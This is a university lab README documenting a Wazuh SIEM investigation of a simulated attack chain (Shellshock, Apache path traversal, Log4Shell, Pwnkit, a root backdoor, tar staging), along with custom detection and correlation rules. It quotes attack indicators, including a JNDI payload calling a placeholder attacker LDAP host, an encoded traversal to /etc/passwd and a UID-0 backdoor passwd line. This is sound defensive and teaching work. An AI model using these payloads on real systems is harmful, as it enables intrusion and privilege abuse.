# Module 4 — Wazuh Threat Hunting & Detection Engineering

## SIEM Investigation, Rule Tuning, MITRE ATT&CK Mapping & Attack-Chain Reconstruction

This project was developed as part of **Cybersecurity Laboratories — Module 4** at the **University of Minho**.

The objective was to investigate a simulated multi-stage attack using **Wazuh**, reduce benign alert noise, reconstruct the attack chain from SIEM telemetry, analyze File Integrity Monitoring events, and improve detection rules through severity tuning, MITRE ATT&CK enrichment and event correlation.

The laboratory focused on practical **SOC analysis**, **Threat Hunting** and **Detection Engineering** rather than simply identifying isolated alerts.

---

# 1. Objectives

The main objectives were to:

- Investigate a hidden attack sequence among large volumes of SIEM events
- Reduce benign noise through Wazuh rule tuning
- Reconstruct the chronological attack chain
- Identify vulnerable services and associated CVEs
- Analyze File Integrity Monitoring (FIM) events
- Correlate events from different stages of the attack
- Improve rule severity based on real security impact
- Enrich custom detections with MITRE ATT&CK mappings
- Create correlation rules for high-confidence attack detection
- Improve SOC visibility by prioritizing meaningful alerts

---

# 2. Environment

The laboratory environment was deployed using **Docker Compose** with the attack profile enabled.

```text
Docker Compose
      │
      ▼
Wazuh Laboratory Environment
      │
      ├── Wazuh Manager
      ├── Wazuh Indexer
      ├── Wazuh Dashboard
      ├── Wazuh Agent
      └── Vulnerable / Attack Infrastructure
```

The environment includes configuration for:

- Wazuh Manager
- Wazuh Agent
- Wazuh Dashboard
- Wazuh Indexer
- Custom rules and decoders
- Laboratory exercises

---

# 3. Project Structure

```text
module-4-wazuh-threat-hunting-detection-engineering/
│
├── README.md
├── presentation.pdf
│
└── wazuh-lab/
    ├── README.md
    ├── docker-compose.yml
    ├── relatorio.md
    │
    ├── config/
    │   ├── custom-rules/
    │   │   ├── local_decoder.xml
    │   │   └── local_rules.xml
    │   │
    │   ├── wazuh_agent/
    │   │   └── ossec.conf
    │   │
    │   ├── wazuh_cluster/
    │   │   └── wazuh_manager.conf
    │   │
    │   ├── wazuh_dashboard/
    │   │   ├── opensearch_dashboards.yml
    │   │   └── wazuh.yml
    │   │
    │   └── wazuh_indexer/
    │       ├── internal_users.yml
    │       └── wazuh.indexer.yml
    │
    └── labs/
        ├── lab1-setup-and-tour.md
        ├── lab2-vulnerability-detection.md
        └── lab3-investigation.md
```

> Private cryptographic keys and local development artifacts should not be published.

---

# 4. Main Technologies

| Area | Technologies |
|---|---|
| SIEM / XDR | Wazuh |
| Threat Hunting | Wazuh Threat Hunting |
| Detection Engineering | Custom Wazuh Rules |
| Integrity Monitoring | Wazuh FIM / Syscheck |
| Threat Framework | MITRE ATT&CK |
| Rule Configuration | XML |
| Infrastructure | Docker, Docker Compose |
| Log Analysis | Wazuh Dashboard |
| Security Baselines | CIS Benchmarks, SCA |
| Attack Analysis | CVE correlation, timeline reconstruction |

---

# 5. Investigation Workflow

The investigation followed a SOC-style workflow.

```text
Raw Security Events
        │
        ▼
Initial Event Triage
        │
        ▼
Noise Identification
        │
        ▼
Severity Filtering
        │
        ▼
Threat Hunting
        │
        ▼
Attack Identification
        │
        ▼
Timeline Reconstruction
        │
        ▼
Rule Tuning
        │
        ▼
MITRE ATT&CK Enrichment
        │
        ▼
Event Correlation
        │
        ▼
High-Confidence Detection
```

---

# 6. Event Triage

The initial monitoring view contained approximately **503 events**.

A large portion of these events consisted of:

- CIS Benchmark checks
- Security Configuration Assessment events
- General system activity
- Repetitive low-value alerts

The first analysis step was therefore to reduce the dataset and improve signal visibility.

A severity filter was applied:

```text
rule.level >= 5
```

This reduced the visible event volume and made suspicious activity easier to identify.

---

# 7. Noise Reduction

A major part of the project involved distinguishing real attack activity from benign laboratory noise.

Several Wazuh rules associated with CIS and SCA checks generated persistent events:

```text
19004
19007
19008
19009
```

Because the laboratory machine was intentionally vulnerable, these compliance failures were expected and did not represent active attacks.

Custom suppression rules were added to:

```text
config/custom-rules/local_rules.xml
```

Example:

```xml
<rule id="100300" level="0">
  <if_sid>19007</if_sid>
  <description>Suppress: CIS Benchmark check — benign, fires on startup</description>
</rule>
```

Equivalent suppression rules were implemented for the other benign compliance alerts.

The events were assigned:

```text
level = 0
```

which removed them from the active investigation view.

---

# 8. Effect of Noise Suppression

After restarting the Wazuh service with the custom rules enabled, the dashboard became significantly cleaner.

This made high-severity attacks immediately visible.

Instead of searching through hundreds of repetitive compliance events, the analyst could focus directly on malicious activity.

This reflects a key SOC principle:

```text
More Alerts ≠ Better Detection
```

The objective is to maximize **signal-to-noise ratio**.

---

# 9. Initial File Integrity Monitoring Evidence

One of the first meaningful signals was generated by Wazuh **File Integrity Monitoring (FIM)**.

Changes were detected in web directories including:

```text
/var/www/html/admin/
/var/www/html/reports/
```

These events indicated suspicious changes occurring before the main exploitation sequence.

FIM later became essential for confirming persistence through modification of:

```text
/etc/passwd
```

---

# 10. Reconstructed Attack Chain

The complete investigation reconstructed the following sequence:

```text
FIM
CGI files modified
        │
        ▼
Shellshock
CVE-2014-6271
        │
        ▼
Path Traversal
CVE-2021-41773
        │
        ▼
Log4Shell
CVE-2021-44228
        │
        ▼
Pwnkit
CVE-2021-4034
        │
        ▼
Privilege Escalation
        │
        ▼
Root Backdoor Account
/etc/passwd modified
        │
        ▼
Suspicious POST
/reports/submit/
        │
        ▼
Data Archiving
tar -cf /tmp/www.tar /var/www
        │
        ▼
Exfiltration Sequence
```

The attacker also generated noise between the meaningful attack stages to make chronological analysis more difficult.

Examples included:

- Simulated login activity
- Suspicious URL requests
- XSS-like patterns

---

# 11. Attack Timeline

| Time | Rule | Event | Final Severity |
|---|---:|---|---:|
| 19:46:59 | 550 | FIM — CGI files modified | 7 |
| 19:48:01 | 31168 | Shellshock — RCE via User-Agent | 15 |
| 19:48:41 | 100120 | Path Traversal — `/etc/passwd` access | 12 |
| 19:50:02 | 100130 | Log4Shell — JNDI lookup | 13 |
| 19:51:52 | 100140 | Pwnkit — privilege escalation | 13 |
| 19:52:32 | 100150 | Root backdoor created in `/etc/passwd` | 15 |
| 19:53:04 | 100162 | Suspicious POST to `/reports/submit/` | 7 |
| 19:54:14 | 100170 | `tar` — exfiltration staging | 13 |

---

# 12. Shellshock — CVE-2014-6271

Wazuh detected a Shellshock exploitation attempt through:

```text
Rule ID: 31168
Level:   15
```

The attack payload was injected through the HTTP `User-Agent` header and targeted:

```text
/cgi-bin/test
```

The built-in Wazuh detection already provided maximum severity and appropriate security context.

No custom severity adjustment was required.

### MITRE ATT&CK

```text
T1190 — Exploit Public-Facing Application
T1068 — Exploitation for Privilege Escalation
```

---

# 13. Path Traversal — CVE-2021-41773

A Path Traversal request was identified through encoded traversal sequences.

Example pattern:

```text
/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd
```

The original rule severity was considered insufficient for the security impact.

### Original Detection

```text
Rule ID: 100120
Level:   6
```

### Tuned Detection

```text
Rule ID: 100120
Level:   12
MITRE:   T1190
Group:   attack
```

Custom rule:

```xml
<rule id="100120" level="12">
  <if_sid>31100</if_sid>
  <regex>\.%2e/|/%2e\.</regex>
  <description>HTTP request: url contains an encoded '..' segment — Path Traversal attempt</description>
  <group>attack,</group>
  <mitre>
    <id>T1190</id>
  </mitre>
</rule>
```

This improved both severity prioritization and dashboard visibility.

---

# 14. Log4Shell — CVE-2021-44228

The Log4Shell attack was identified through a JNDI lookup payload:

```text
${jndi:ldap://attacker:1389/Exploit}
```

The event was found in:

```text
/var/log/vuln-app/app.log
```

### Original Detection

```text
Rule ID: 100130
Level:   6
```

The original level underestimated the severity of a potential Remote Code Execution attempt.

### Tuned Detection

```text
Rule ID: 100130
Level:   13
MITRE:   T1190
Group:   attack
```

Custom rule:

```xml
<rule id="100130" level="13">
  <match>jndi:</match>
  <description>Log4Shell: JNDI lookup detected — CVE-2021-44228 RCE attempt</description>
  <group>attack,</group>
  <mitre>
    <id>T1190</id>
  </mitre>
</rule>
```

---

# 15. Correlated Log4Shell Detection

A higher-confidence correlation rule was also implemented.

If Log4Shell activity was followed by modification of `/etc/passwd` inside a 120-second window, the sequence was treated as a critical compromise.

```xml
<rule id="100155" level="15" frequency="2" timeframe="120">
  <if_matched_sid>100130</if_matched_sid>
  <if_matched_sid>100150</if_matched_sid>
  <description>CRITICAL: Log4Shell RCE confirmed — /etc/passwd modified after JNDI lookup within 120s</description>
  <group>attack,critical,</group>
  <mitre>
    <id>T1190</id>
    <id>T1136.001</id>
  </mitre>
</rule>
```

This moves detection from a single-event model toward **behavioral correlation**.

---

# 16. Pwnkit — CVE-2021-4034

Pwnkit exploitation was identified from `pkexec` activity.

The relevant log contained the pattern:

```text
GCONV_PATH=. pwning
```

The attack represented confirmed privilege escalation to root.

### Original Detection

```text
Rule ID: 100140
Level:   5
```

### Tuned Detection

```text
Rule ID: 100140
Level:   13
MITRE:   T1068
Group:   attack
```

Custom rule:

```xml
<rule id="100140" level="13">
  <match>pkexec</match>
  <description>Pwnkit: pkexec privilege escalation detected — CVE-2021-4034</description>
  <group>attack,</group>
  <mitre>
    <id>T1068</id>
  </mitre>
</rule>
```

### MITRE ATT&CK

```text
T1068 — Exploitation for Privilege Escalation
```

---

# 17. Root Backdoor Detection

After the Pwnkit event, Wazuh FIM detected a modification to:

```text
/etc/passwd
```

The `syscheck.diff` field revealed the creation of:

```text
lab-backdoor:x:0:0::/root:/bin/sh
```

The account used:

```text
UID = 0
GID = 0
```

which provides root-equivalent privileges.

This represents persistent access because the attacker could later authenticate using a privileged local account.

### Original Detection

```text
Rule ID: 100150
Level:   8
```

### Tuned Detection

```text
Rule ID: 100150
Level:   15
MITRE:   T1136.001
```

Custom rule:

```xml
<rule id="100150" level="15">
  <if_sid>550,554</if_sid>
  <field name="file">/etc/passwd</field>
  <description>FIM: /etc/passwd modified — possible backdoor account created</description>
  <group>attack,</group>
  <mitre>
    <id>T1136.001</id>
  </mitre>
</rule>
```

### MITRE ATT&CK

```text
T1136.001 — Create Account: Local Account
```

---

# 18. Authentication Events

Custom rules were also present for both application and HTTP authentication telemetry.

Examples include:

```text
100163 — HTTP POST /login failure
100164 — HTTP POST /login success
100165 — CorpNet login failure
100166 — CorpNet login success
```

These events provide useful context when reconstructing activity around the major attack stages.

---

# 19. Data Exfiltration Investigation

The final attack stage involved suspicious activity associated with data collection and exfiltration.

A POST request was detected to:

```text
/reports/submit/
```

using a non-standard client.

Later, a `tar` command appeared:

```bash
tar -cf /tmp/www.tar /var/www
```

This archived the web directory and represented staging before data exfiltration.

---

# 20. Suspicious POST Detection

The POST event was represented by rule:

```text
100162
```

The rule was tuned to:

```text
Level: 7
MITRE: T1071.001
```

Custom rule:

```xml
<rule id="100162" level="7">
  <if_sid>31108</if_sid>
  <match>POST /reports/submit/</match>
  <description>Apache: POST to /reports/submit/ — possible Heartbleed exfil staging</description>
  <group>attack,</group>
  <mitre>
    <id>T1071.001</id>
  </mitre>
</rule>
```

---

# 21. Data Archiving Detection

The staging command was detected with:

```text
Rule ID: 100170
Level:   13
MITRE:   T1560.001
```

Custom rule:

```xml
<rule id="100170" level="13">
  <match>tar</match>
  <description>Exfiltration staging: tar invoked — possible data archiving for exfil</description>
  <group>attack,</group>
  <mitre>
    <id>T1560.001</id>
  </mitre>
</rule>
```

### MITRE ATT&CK

```text
T1560.001 — Archive Collected Data
```

---

# 22. Exfiltration Correlation Rule

Rather than relying only on isolated events, a correlation rule was created.

If the suspicious report submission was followed by archive creation within **120 seconds**, Wazuh generated a critical alert.

```xml
<rule id="100171" level="15" frequency="2" timeframe="120">
  <if_matched_sid>100162</if_matched_sid>
  <if_matched_sid>100170</if_matched_sid>
  <description>Exfiltration detected: report submission followed by tar archiving within 120s</description>
  <group>attack,</group>
  <mitre>
    <id>T1041</id>
  </mitre>
</rule>
```

### Final Severity

```text
Level: 15
```

### MITRE ATT&CK

```text
T1041 — Exfiltration Over C2 Channel
```

This correlation provides significantly higher confidence than either event in isolation.

---

# 23. XSS-Pattern Detection

The ruleset also contains a detection associated with scripting-expression patterns:

```xml
<rule id="100175" level="7">
  <if_sid>31105</if_sid>
  <description>HTTP request: url contains a scripting expression pattern</description>
  <mitre>
    <id>T1059.007</id>
  </mitre>
</rule>
```

MITRE mapping:

```text
T1059.007 — Command and Scripting Interpreter: JavaScript
```

These events were useful during the investigation because attack-noise activity included XSS-like requests designed to complicate analysis.

---

# 24. Detection Engineering Improvements

The project did not treat the default SIEM configuration as final.

Rules were reviewed according to actual impact.

| Detection | Initial Level | Tuned Level | MITRE |
|---|---:|---:|---|
| Path Traversal | 6 | 12 | T1190 |
| Log4Shell | 6 | 13 | T1190 |
| Pwnkit | 5 | 13 | T1068 |
| Root Backdoor | 8 | 15 | T1136.001 |
| Suspicious POST | 4 | 7 | T1071.001 |
| `tar` Staging | 7 | 13 | T1560.001 |
| Exfiltration Correlation | — | 15 | T1041 |

This transformed generic alerts into more actionable SOC detections.

---

# 25. MITRE ATT&CK Coverage

The custom rules map attack behavior to several MITRE ATT&CK techniques.

```text
T1190     Exploit Public-Facing Application
T1068     Exploitation for Privilege Escalation
T1136.001 Create Account: Local Account
T1071.001 Web Protocols
T1560.001 Archive Collected Data
T1041     Exfiltration Over C2 Channel
T1059.007 JavaScript
```

MITRE mapping improves:

- Investigation context
- Dashboard filtering
- Detection categorization
- Threat-hunting workflows
- Incident reporting

---

# 26. File Integrity Monitoring

Wazuh FIM was especially important during the investigation.

It helped detect:

- Changes to web content
- Changes to administrative directories
- Creation or modification of sensitive files
- Modification of `/etc/passwd`

The `/etc/passwd` event was particularly significant because the file diff provided direct evidence of the root backdoor account.

This demonstrates how file-integrity telemetry can confirm persistence that may otherwise be difficult to detect through network logs alone.

---

# 27. Threat Hunting

The Wazuh Threat Hunting interface was used to:

- Sort events chronologically
- Filter by agent
- Filter by rule severity
- Inspect raw event details
- Review HTTP payloads
- Investigate FIM changes
- Correlate suspicious activity
- Reconstruct the complete timeline

A useful final filter was:

```text
agent.name: victim AND rule.level >= 12
```

After tuning, this view showed only the most relevant high-severity events.

---

# 28. Final Detection View

After all tuning and noise suppression:

- CIS/SCA noise was removed from the active view
- Critical CVE exploitation attempts became immediately visible
- Path Traversal appeared at level 12
- Log4Shell appeared at level 13
- Pwnkit appeared at level 13
- Data archiving appeared at level 13
- Root-backdoor activity appeared at level 15
- Correlated attack sequences could generate level 15 detections

The result was a much cleaner SOC investigation view with higher-quality alerts.

---

# 29. Key Security Lessons

## Alert Quality Matters More Than Alert Volume

A SIEM generating hundreds of low-value events can make meaningful attacks harder to identify.

## Severity Must Reflect Security Impact

Default detection levels are not always appropriate for a specific environment.

Detection engineers should review severity based on:

- Exploit impact
- Confidence
- Context
- Asset importance
- Attack-chain position

## Correlation Improves Confidence

A single event can be ambiguous.

A sequence such as:

```text
Suspicious POST
      +
Archive Creation
      │
      ▼
High-Confidence Exfiltration Alert
```

provides much stronger evidence.

## FIM Can Confirm Persistence

The modification of `/etc/passwd` demonstrated how file-integrity telemetry can provide definitive evidence of system compromise.

## MITRE ATT&CK Adds Operational Context

Mapping detections to ATT&CK techniques makes alerts easier to categorize, investigate and communicate.

---

# 30. Skills Demonstrated

This project demonstrates practical experience in:

- SOC Analysis
- SIEM Operations
- Wazuh
- Threat Hunting
- Detection Engineering
- Security Monitoring
- Incident Investigation
- Attack-Chain Reconstruction
- Log Correlation
- Rule Tuning
- Custom SIEM Rules
- XML Rule Development
- File Integrity Monitoring
- Wazuh Syscheck
- MITRE ATT&CK Mapping
- CVE Analysis
- Noise Reduction
- Alert Prioritization
- Security Configuration Assessment
- CIS Benchmark Analysis
- Docker
- Docker Compose

---

# 31. CVEs Investigated

The investigation covered multiple known vulnerabilities and related attack stages.

```text
CVE-2014-6271  — Shellshock
CVE-2021-41773 — Apache Path Traversal
CVE-2021-44228 — Log4Shell
CVE-2021-4034  — Pwnkit
CVE-2014-0160  — Heartbleed / exfiltration scenario
```

---

# 32. Presentation

The repository includes the complete project presentation:

[View the presentation](./presentation.pdf)

The presentation contains the full investigation workflow, Wazuh dashboard evidence, attack timeline, rule tuning and MITRE ATT&CK mappings.

---

# 33. Academic Context

**Course:** Cybersecurity Laboratories  
**Module:** Module 4 — Wazuh Threat Hunting & Detection Engineering  
**Institution:** University of Minho — School of Engineering  
**Academic Year:** 2025/2026

---

# 34. Disclaimer

This repository documents a **controlled academic cybersecurity laboratory**.

The attacks, CVEs, rules and detection techniques were analyzed in an isolated environment for educational, defensive and research purposes.

The material is intended to demonstrate:

- SIEM analysis
- Threat hunting
- Detection engineering
- Incident investigation
- Defensive cybersecurity practices

No production or third-party systems were targeted.
